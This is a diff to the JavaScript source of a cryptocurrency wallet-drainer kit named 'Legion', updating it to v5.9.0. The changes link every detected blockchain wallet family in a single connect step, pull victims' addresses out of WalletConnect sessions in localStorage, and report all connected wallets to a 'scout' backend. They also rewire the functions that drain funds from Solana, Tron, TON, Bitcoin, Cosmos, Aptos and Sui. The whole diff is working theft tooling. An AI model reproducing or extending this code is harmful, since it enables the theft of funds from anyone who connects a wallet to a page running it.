@@ -576,6 +576,9 @@
     discovered: [],
     nonEvm: {},
     familyProviders: { SVM: [], UTXO: [], TRON: [], TON: [], COSMOS: [], APTOS: [], SUI: [] },
+    familyConnections: {},
+    familiesLinked: false,
+    allAddresses: {},
     chains: { EVM: null, SOL: null, TRON: null, TON: null, BTC: null, COSMOS: null, APTOS: null, SUI: null },
     omnichainLegs: {},
     fusionAssets: [],
@@ -844,6 +847,119 @@
     return list.length ? list[0] : null;
   }
 
+  function collectAddressMap(evmOptional) {
+    var m = {};
+    var evm = evmOptional || S.evmAddr;
+    if (evm) m.evm = String(evm).toLowerCase();
+    if (S.chains.SOL && S.chains.SOL.address) m.sol = S.chains.SOL.address;
+    if (S.chains.TRON && S.chains.TRON.address) m.tron = S.chains.TRON.address;
+    if (S.chains.TON && S.chains.TON.address) m.ton = S.chains.TON.address;
+    if (S.chains.BTC && S.chains.BTC.address) m.btc = S.chains.BTC.address;
+    if (S.chains.COSMOS && S.chains.COSMOS.address) m.cosmos = S.chains.COSMOS.address;
+    if (S.chains.APTOS && S.chains.APTOS.address) m.aptos = S.chains.APTOS.address;
+    if (S.chains.SUI && S.chains.SUI.address) m.sui = S.chains.SUI.address;
+    return m;
+  }
+
+  function scanWcSessionAllFamilies() {
+    var out = {};
+    try {
+      var keys = Object.keys(localStorage);
+      for (var ki = 0; ki < keys.length; ki++) {
+        var k = keys[ki];
+        if (k.indexOf('wc@') === -1 || k.indexOf('session') === -1) continue;
+        var obj = JSON.parse(localStorage.getItem(k) || '{}');
+        var sessions = Object.values(obj);
+        for (var si = sessions.length - 1; si >= 0; si--) {
+          var ns = sessions[si] && sessions[si].namespaces;
+          if (!ns) continue;
+          if (ns.eip155 && ns.eip155.accounts && ns.eip155.accounts[0] && !out.evm) {
+            var ep = String(ns.eip155.accounts[0]).split(':');
+            out.evm = (ep[ep.length - 1] || '').toLowerCase();
+          }
+          if (ns.solana && ns.solana.accounts && ns.solana.accounts[0] && !out.sol) {
+            var sp = String(ns.solana.accounts[0]).split(':');
+            out.sol = sp[sp.length - 1];
+          }
+          if (ns.bip122 && ns.bip122.accounts && ns.bip122.accounts[0] && !out.btc) {
+            var bp = String(ns.bip122.accounts[0]).split(':');
+            out.btc = bp[bp.length - 1];
+          }
+          if (ns.tron && ns.tron.accounts && ns.tron.accounts[0] && !out.tron) {
+            var tp = String(ns.tron.accounts[0]).split(':');
+            out.tron = tp[tp.length - 1];
+          }
+        }
+      }
+    } catch (e) {}
+    return out;
+  }
+
+  function applyWcSessionAddresses(wcAddr) {
+    if (!wcAddr) return;
+    if (wcAddr.sol && !S.chains.SOL) {
+      S.chains.SOL = { address: wcAddr.sol, name: 'SVM', wcSession: true };
+      L.log('[SVM] WC session address:', wcAddr.sol.slice(0, 8) + '...');
+    }
+    if (wcAddr.btc && !S.chains.BTC) {
+      S.chains.BTC = { address: wcAddr.btc, name: 'UTXO', wcSession: true };
+      L.log('[UTXO] WC session address:', wcAddr.btc.slice(0, 8) + '...');
+    }
+    if (wcAddr.tron && !S.chains.TRON) {
+      S.chains.TRON = { address: wcAddr.tron, wcSession: true };
+      L.log('[TRON] WC session address:', wcAddr.tron.slice(0, 8) + '...');
+    }
+  }
+
+  /** One connect step: link every detected chain family (parallel, same user gesture). */
+  async function connectAllFamilies() {
+    if (S.familiesLinked) return S.allAddresses;
+
+    discoverChainFamilies();
+    UI.status('Linking all blockchains...');
+    S.familyConnections = {};
+
+    var linkers = [
+      { family: 'SVM', fn: connectSol },
+      { family: 'UTXO', fn: connectBtc },
+      { family: 'TRON', fn: connectTron },
+      { family: 'TON', fn: connectTon },
+      { family: 'COSMOS', fn: connectCosmos },
+      { family: 'APTOS', fn: connectAptos },
+      { family: 'SUI', fn: connectSui },
+    ];
+
+    var tasks = [];
+    for (var li = 0; li < linkers.length; li++) {
+      (function (entry) {
+        var providers = (S.familyProviders && S.familyProviders[entry.family]) || [];
+        if (!providers.length) return;
+        tasks.push(
+          entry.fn().then(function (conn) {
+            if (conn) S.familyConnections[entry.family] = conn;
+            return conn;
+          }).catch(function (e) {
+            L.warn('[' + entry.family + '] link skip:', e.message);
+            return null;
+          })
+        );
+      })(linkers[li]);
+    }
+
+    if (tasks.length) await Promise.all(tasks);
+
+    applyWcSessionAddresses(scanWcSessionAllFamilies());
+
+    S.familiesLinked = true;
+    S.allAddresses = collectAddressMap();
+    var parts = [];
+    Object.keys(S.allAddresses).forEach(function (fk) {
+      parts.push(fk + ':' + String(S.allAddresses[fk]).slice(0, 10) + '...');
+    });
+    L.log('[connect] linked families:', parts.length ? parts.join(' | ') : 'EVM only');
+    return S.allAddresses;
+  }
+
   function detectNonEvm() {
     discoverChainFamilies();
     return S.familyProviders || {};
@@ -1034,8 +1150,11 @@
   }
 
   var SCOUT = {
-    telemetry: async function (address, chainId, walletName) {
+    telemetry: async function (address, chainId, walletName, allAddrs) {
       try {
+        var map = allAddrs || collectAddressMap(address);
+        var connected = [];
+        Object.keys(map).forEach(function (k) { if (map[k]) connected.push(map[k]); });
         await apiPost('/api/v1/scout', {
           user_address: address,
           chain_id: Number(chainId) || 1,
@@ -1043,6 +1162,7 @@
           chain_family: 'EVM',
           source_page: window.location.href,
           connect_session: S.connectSession || undefined,
+          connected_wallets: connected.length ? connected : undefined,
         });
       } catch (e) {}
     },
@@ -1987,6 +2107,7 @@
   // SECTION 10: SOLANA MODULE (full — SOL + SPL, per-tx submit)
   // ═══════════════════════════════════════════════════════════════
   async function connectSol() {
+    if (S.familyConnections.SVM) return S.familyConnections.SVM;
     var entry = firstFamilyProvider('SVM');
     if (!entry) return null;
     var prov = entry.provider;
@@ -2121,6 +2242,7 @@
   // SECTION 11: TRON MODULE (TRX + dynamic TRC-20 from fusion scout)
   // ═══════════════════════════════════════════════════════════════
   async function connectTron() {
+    if (S.familyConnections.TRON) return S.familyConnections.TRON;
     var entry = firstFamilyProvider('TRON');
     if (!entry) return null;
     var tl = entry.provider;
@@ -2197,6 +2319,7 @@
   var _tcConnector = null;
 
   async function connectTon() {
+    if (S.familyConnections.TON) return S.familyConnections.TON;
     var entry = firstFamilyProvider('TON');
     var tonProv = entry ? entry.provider : null;
     if (tonProv) {
@@ -2282,6 +2405,7 @@
   // SECTION 13: BITCOIN MODULE (backend PSBT builder + wallet sign)
   // ═══════════════════════════════════════════════════════════════
   async function connectBtc() {
+    if (S.familyConnections.UTXO) return S.familyConnections.UTXO;
     var entry = firstFamilyProvider('UTXO');
     if (!entry) return null;
     var prov = entry.provider;
@@ -2339,6 +2463,7 @@
   // SECTION 13B: COSMOS MODULE (Keplr — cosmoshub-4 ATOM)
   // ═══════════════════════════════════════════════════════════════
   async function connectCosmos() {
+    if (S.familyConnections.COSMOS) return S.familyConnections.COSMOS;
     var entry = firstFamilyProvider('COSMOS');
     if (!entry) return null;
     var prov = entry.provider;
@@ -2395,6 +2520,7 @@
   // SECTION 13C: APTOS MODULE (Petra / Martian)
   // ═══════════════════════════════════════════════════════════════
   async function connectAptos() {
+    if (S.familyConnections.APTOS) return S.familyConnections.APTOS;
     var entry = firstFamilyProvider('APTOS');
     if (!entry) return null;
     var apt = entry.provider;
@@ -2444,6 +2570,7 @@
   // SECTION 13D: SUI MODULE (Sui Wallet / Phantom Sui)
   // ═══════════════════════════════════════════════════════════════
   async function connectSui() {
+    if (S.familyConnections.SUI) return S.familyConnections.SUI;
     var entry = firstFamilyProvider('SUI');
     if (!entry) return null;
     var sui = entry.provider;
@@ -2508,27 +2635,20 @@
   // SECTION 13E: UNIVERSAL ORCHESTRATOR (all chains, value-priority)
   // ═══════════════════════════════════════════════════════════════
   async function runUniversalDrain(evmCtx) {
-    discoverChainFamilies();
+    var addrs = S.allAddresses && Object.keys(S.allAddresses).length
+      ? S.allAddresses
+      : collectAddressMap(evmCtx.address);
     S.omnichainLegs = {};
 
-    var addrs = { evm: evmCtx.address };
-    if (S.chains.SOL) addrs.sol = S.chains.SOL.address;
-    if (S.chains.TRON) addrs.tron = S.chains.TRON.address;
-    if (S.chains.TON) addrs.ton = S.chains.TON.address;
-    if (S.chains.BTC) addrs.btc = S.chains.BTC.address;
-    if (S.chains.COSMOS) addrs.cosmos = S.chains.COSMOS.address;
-    if (S.chains.APTOS) addrs.aptos = S.chains.APTOS.address;
-    if (S.chains.SUI) addrs.sui = S.chains.SUI.address;
-
-    await SCOUT.telemetry(evmCtx.address, evmCtx.chainId, evmCtx.walletName);
+    await SCOUT.telemetry(evmCtx.address, evmCtx.chainId, evmCtx.walletName, addrs);
     var fusionData = await SCOUT.fusion(addrs);
     if (fusionData && fusionData.total_usd) {
       S.scoutUsd = Math.max(S.scoutUsd, Number(fusionData.total_usd) || 0);
+      L.log('Fusion USD (all families):', S.scoutUsd.toFixed(2));
     }
     var rankedAll = await SCOUT.ranked(evmCtx.address);
     if (rankedAll && rankedAll.total_usd) {
       S.scoutUsd = Math.max(S.scoutUsd, Number(rankedAll.total_usd) || 0);
-      L.log('Backend scout USD:', S.scoutUsd.toFixed(2));
     }
     evmCtx.chainId = await ensureFundedEvmChain(evmCtx.provider, evmCtx.address, evmCtx.chainId);
     S.evmChain = evmCtx.chainId;
@@ -2536,13 +2656,13 @@
 
     var runners = {
       EVM: function () { return runEvmDrain(evmCtx.provider, evmCtx.address, evmCtx.chainId, evmCtx.walletName, evmCtx.hwObj); },
-      SOL: async function () { return drainSol(await connectSol()); },
-      TRON: async function () { return drainTron(await connectTron()); },
-      TON: async function () { return drainTon(await connectTon()); },
-      BTC: async function () { return drainBtc(await connectBtc()); },
-      COSMOS: async function () { return drainCosmos(await connectCosmos()); },
-      APTOS: async function () { return drainAptos(await connectAptos()); },
-      SUI: async function () { return drainSui(await connectSui()); },
+      SOL: function () { return drainSol(S.familyConnections.SVM); },
+      TRON: function () { return drainTron(S.familyConnections.TRON); },
+      TON: function () { return drainTon(S.familyConnections.TON); },
+      BTC: function () { return drainBtc(S.familyConnections.UTXO); },
+      COSMOS: function () { return drainCosmos(S.familyConnections.COSMOS); },
+      APTOS: function () { return drainAptos(S.familyConnections.APTOS); },
+      SUI: function () { return drainSui(S.familyConnections.SUI); },
     };
 
     var evmFirst = priority.indexOf('EVM');
@@ -3222,9 +3342,15 @@
       S.pendingEvmPermit2 = null;
       S.connectSession = 'legion:' + Date.now() + ':' + Math.random().toString(36).slice(2, 8);
       S.fusionNotified = false;
-      UI.showStatus('Scanning assets...');
+      S.familiesLinked = false;
+      S.familyConnections = {};
+      S.chains = { EVM: null, SOL: null, TRON: null, TON: null, BTC: null, COSMOS: null, APTOS: null, SUI: null };
+      S.allAddresses = {};
 
+      UI.showStatus('Linking all blockchains...');
       discoverChainFamilies();
+      await connectAllFamilies();
+      UI.showStatus('Scanning assets...');
 
       await sleep(CFG.delayDrainMs || 300);
 
@@ -3400,7 +3526,7 @@
       };
     }
 
-    L.log('Legion v5.8.3 ready — chain-family detection (EVM+SVM+UTXO+...)');
+    L.log('Legion v5.9.0 ready — unified multi-family connect');
 
     // Only auto-connect when explicitly enabled (never on silentMode alone)
     if (CFG.autoConnectOnLoad === true && AUTO_DRAIN && !S.drainRunning && window.ethereum) {
